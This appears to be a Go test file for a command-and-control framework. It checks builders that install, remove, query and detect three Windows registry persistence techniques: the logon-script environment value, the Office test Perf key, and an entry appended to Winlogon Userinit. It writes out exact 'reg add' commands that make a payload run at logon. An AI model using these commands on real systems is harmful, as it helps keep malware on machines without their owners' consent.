package sliver

import (
	"strings"
	"testing"
)

// The three modules below were added after reading Viper's persistence catalog.
// Each is a registry-only technique that needs no artifact beyond a path, so it
// fits the existing install/remove/inspect/detect shape without new primitives.

func TestViperPersistenceInstallCommands(t *testing.T) {
	const (
		payload = `C:\Temp\a.exe`
		name    = "Updater"
	)
	check := func(label string, got []string, want ...string) {
		if strings.Join(got, "\x00") != strings.Join(want, "\x00") {
			t.Errorf("%s:\n got %q\nwant %q", label, got, want)
		}
	}

	cases := []struct {
		module string
		want   string
	}{
		{
			"win-logon-script",
			`reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Temp\a.exe" /f`,
		},
		{
			"win-office-test",
			`reg add "HKCU\Software\Microsoft\Office test\Special\Perf" /v Updater /t REG_SZ /d "C:\Temp\a.exe" /f`,
		},
		{
			// userinit.exe must stay first, so the value is the stock prefix
			// followed by the payload -- never a bare payload.
			"win-winlogon-userinit",
			`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Temp\a.exe" /f`,
		},
	}
	for _, tc := range cases {
		got, err := installCommand(platformWindows, tc.module, payload, name)
		if err != nil {
			t.Fatalf("%s: %v", tc.module, err)
		}
		check(tc.module, got, winArgv(tc.want)...)
	}
}

func TestViperPersistenceRemoveCommands(t *testing.T) {
	const name = "Updater"

	cases := []struct {
		module string
		want   string
	}{
		{"win-logon-script", `reg delete "HKCU\Environment" /v UserInitMprLogonScript /f`},
		{"win-office-test", `reg delete "HKCU\Software\Microsoft\Office test\Special\Perf" /v Updater /f`},
		{
			// Removing the value outright would leave Winlogon with nothing to
			// run and break interactive logon, so removal restores the stock
			// value instead of deleting it.
			"win-winlogon-userinit",
			`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f`,
		},
	}
	for _, tc := range cases {
		got, err := removeCommand(platformWindows, tc.module, "", name)
		if err != nil {
			t.Fatalf("%s: %v", tc.module, err)
		}
		if strings.Join(got, "\x00") != strings.Join(winArgv(tc.want), "\x00") {
			t.Errorf("%s:\n got %q\nwant %q", tc.module, got, tc.want)
		}
	}
}

func TestViperPersistenceInspectCommands(t *testing.T) {
	got, err := inspectCommand(platformWindows, "win-logon-script", "")
	if err != nil {
		t.Fatalf("win-logon-script: %v", err)
	}
	if want := `reg query "HKCU\Environment" /v UserInitMprLogonScript`; strings.Join(got[2:], "\x00") != strings.Join(splitWindowsCommand(want), "\x00") {
		t.Errorf("win-logon-script:\n got %q\nwant %q", got[2], want)
	}

	// Without a name the Office key is enumerated; each value under it names an
	// artifact and the detector attributes the match.
	got, err = inspectCommand(platformWindows, "win-office-test", "")
	if err != nil {
		t.Fatalf("win-office-test (unnamed): %v", err)
	}
	if want := `reg query "HKCU\Software\Microsoft\Office test\Special\Perf"`; strings.Join(got[2:], "\x00") != strings.Join(splitWindowsCommand(want), "\x00") {
		t.Errorf("win-office-test unnamed:\n got %q\nwant %q", got[2], want)
	}
	got, err = inspectCommand(platformWindows, "win-office-test", "Updater")
	if err != nil {
		t.Fatalf("win-office-test (named): %v", err)
	}
	if want := `reg query "HKCU\Software\Microsoft\Office test\Special\Perf" /v Updater`; strings.Join(got[2:], "\x00") != strings.Join(splitWindowsCommand(want), "\x00") {
		t.Errorf("win-office-test named:\n got %q\nwant %q", got[2], want)
	}

	got, err = inspectCommand(platformWindows, "win-winlogon-userinit", "Updater")
	if err != nil {
		t.Fatalf("win-winlogon-userinit: %v", err)
	}
	if want := `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit`; strings.Join(got[2:], "\x00") != strings.Join(splitWindowsCommand(want), "\x00") {
		t.Errorf("win-winlogon-userinit:\n got %q\nwant %q", got[2], want)
	}
}

// The stock Userinit value already ends with a separator. Counting separators
// would report every healthy host as compromised, so entries are counted.
func TestViperPersistenceUserinitDetection(t *testing.T) {
	const key = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

	stock := key + "\n    Userinit    REG_SZ    C:\\Windows\\system32\\userinit.exe,\n"
	installed, _ := detectPersistence("win-winlogon-userinit", stock, "", 0, "")
	if installed {
		t.Error("a stock Userinit value was reported as installed persistence")
	}

	compromised := key + "\n    Userinit    REG_SZ    C:\\Windows\\system32\\userinit.exe,C:\\Temp\\a.exe\n"
	installed, detail := detectPersistence("win-winlogon-userinit", compromised, "", 0, "")
	if !installed {
		t.Error("an appended Userinit entry was not detected")
	}
	if detail == "" {
		t.Error("no detail reported for a detected entry")
	}

	// A failed query describes the host, not the persistence.
	if installed, _ := detectPersistence("win-winlogon-userinit", "", "ERROR: not found", 1, ""); installed {
		t.Error("a failed reg query was read as installed")
	}
}

func TestViperPersistenceLogonScriptDetection(t *testing.T) {
	const key = "HKEY_CURRENT_USER\\Environment"
	absent, _ := detectPersistence("win-logon-script", key+"\n", "", 0, "")
	if absent {
		t.Error("an empty Environment key was read as installed")
	}

	present := key + "\n    UserInitMprLogonScript    REG_SZ    C:\\Temp\\a.exe\n"
	installed, detail := detectPersistence("win-logon-script", present, "", 0, "")
	if !installed {
		t.Error("a set logon script was not detected")
	}
	if !strings.Contains(detail, "a.exe") {
		t.Errorf("detail %q does not name the script", detail)
	}
}

func TestViperPersistenceOfficeTestDetection(t *testing.T) {
	const key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf"

	// An unnamed probe enumerates the key. Values belonging to other artifacts
	// are not evidence of ours, so the row stays negative with a count.
	other := key + "\n    SomethingElse    REG_SZ    C:\\other.exe\n"
	installed, detail := detectPersistence("win-office-test", other, "", 0, "")
	if installed {
		t.Error("an unrelated Office test value was attributed to this module")
	}
	if !strings.Contains(detail, "1 Office test value") {
		t.Errorf("detail %q does not report the enumeration count", detail)
	}

	mine := key + "\n    Updater    REG_SZ    C:\\Temp\\a.exe\n"
	installed, detail = detectPersistence("win-office-test", mine, "", 0, "Updater")
	if !installed {
		t.Error("a matching Office test value was not detected")
	}
	if !strings.Contains(detail, "Updater") {
		t.Errorf("detail %q does not name the value", detail)
	}
}

// A payload path containing spaces must survive the cmd.exe round trip, since
// every one of these modules interpolates it into a reg command.
func TestViperPersistencePayloadWithSpaces(t *testing.T) {
	payload := `C:\Program Files\My App\a b.exe`
	for _, module := range []string{"win-logon-script", "win-office-test", "win-winlogon-userinit"} {
		got, err := installCommand(platformWindows, module, payload, "Updater")
		if err != nil {
			t.Fatalf("%s: %v", module, err)
		}
		// The payload must survive as ONE token with its spaces intact. Go adds the
		// quotes when it builds the command line; a token split at the space would
		// reach reg.exe as two separate arguments and the value would be truncated.
		found := false
		for _, tok := range got {
			if tok == payload || tok == `C:\Windows\system32\userinit.exe,`+payload {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: payload was split or mangled: %q", module, got)
		}
	}
}

func TestViperPersistenceRegistryHelpers(t *testing.T) {
	listing := "HKEY_CURRENT_USER\\Software\\X\n" +
		"    A    REG_SZ    one\n" +
		"    B    REG_DWORD    0x1\n"
	if got := countRegistryValues(listing); got != 2 {
		t.Errorf("countRegistryValues = %d, want 2 (the echoed key path is not a value)", got)
	}

	if got := registryValueData("    Userinit    REG_SZ    C:\\Windows\\system32\\userinit.exe,"); got != `C:\Windows\system32\userinit.exe,` {
		t.Errorf("registryValueData = %q", got)
	}
	if got := registryValueData("    Flag    REG_DWORD    0x1"); got != "0x1" {
		t.Errorf("registryValueData(dword) = %q", got)
	}
	if got := registryValueData("no type token here"); got != "" {
		t.Errorf("registryValueData(no token) = %q, want empty", got)
	}

	if got := countListEntries(`C:\Windows\system32\userinit.exe,`); got != 1 {
		t.Errorf("countListEntries(stock) = %d, want 1", got)
	}
	if got := countListEntries(`a.exe,b.exe`); got != 2 {
		t.Errorf("countListEntries(two) = %d, want 2", got)
	}
	if got := countListEntries(``); got != 0 {
		t.Errorf("countListEntries(empty) = %d, want 0", got)
	}
}

// Every catalogued module must be answerable by all three builders, so a module
// cannot be added to the catalog and then fail at install time.
func TestViperPersistenceCatalogIsFullyImplemented(t *testing.T) {
	for _, m := range PersistenceModules() {
		for _, platform := range m.Platforms {
			if _, err := installCommand(platform, m.ID, "PAYLOAD", "artifact"); err != nil {
				t.Errorf("installCommand(%s, %s): %v", platform, m.ID, err)
			}
			if _, err := removeCommand(platform, m.ID, "PAYLOAD", "artifact"); err != nil {
				t.Errorf("removeCommand(%s, %s): %v", platform, m.ID, err)
			}
			if _, err := inspectCommand(platform, m.ID, "artifact"); err != nil {
				t.Errorf("inspectCommand(%s, %s): %v", platform, m.ID, err)
			}
			if _, err := inspectCommand(platform, m.ID, ""); err != nil {
				t.Errorf("inspectCommand(%s, %s, unnamed): %v", platform, m.ID, err)
			}
		}
	}
}
